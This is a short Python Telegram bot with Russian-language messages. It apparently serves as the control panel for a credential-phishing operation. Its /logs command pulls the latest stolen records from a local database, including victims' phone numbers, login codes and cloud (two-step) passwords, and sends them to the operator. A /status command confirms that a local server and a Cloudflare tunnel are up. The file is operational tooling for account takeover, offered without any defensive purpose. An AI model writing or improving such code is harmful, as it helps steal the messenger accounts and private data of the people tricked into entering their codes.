import asyncio
import logging
import sqlite3
from aiogram import Bot, Dispatcher, types
from aiogram.filters import Command

TOKEN = "ТВОЙ_ТОКЕН_БОТА_ОТ_BOTFATHER"

bot = Bot(token=TOKEN)
dp = Dispatcher()

@dp.message(Command("start"))
async def cmd_start(message: types.Message):
    await message.answer(
        "🤖 *67 Bot Manager активирован!*\n\n"
        "Доступные команды:\n"
        "/logs — Показать последние записи из базы\n"
        "/status — Проверить статус локального сервера"
    )

@dp.message(Command("logs"))
async def cmd_logs(message: types.Message):
    try:
        conn = sqlite3.connect("messenger_67.db")
        c = conn.cursor()
        c.execute("SELECT timestamp, ip, phone, code, cloud_password FROM logs ORDER BY id DESC LIMIT 5")
        rows = c.fetchall()
        conn.close()

        if not rows:
            await message.answer("📭 База данных пока пуста.")
            return

        text = "📋 *Последние логи из базы:*\n\n"
        for row in rows:
            text += f"🕒 `{row[0][:19]}`\n📞 Телефон: `{row[2]}`\n💬 Код: `{row[3]}`\n🔒 Пароль: `{row[4]}`\n-------------------\n"
        
        await message.answer(text, parse_mode="Markdown")
    except Exception as e:
        await message.answer(f"❌ Ошибка чтения БД: {e}")

@dp.message(Command("status"))
async def cmd_status(message: types.Message):
    await message.answer("🟢 Локальный сервер на ПК работает, туннель Cloudflare активен!")

async def main():
    logging.basicConfig(level=logging.INFO)
    print("Бот запущен и ожидает запросы...")
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
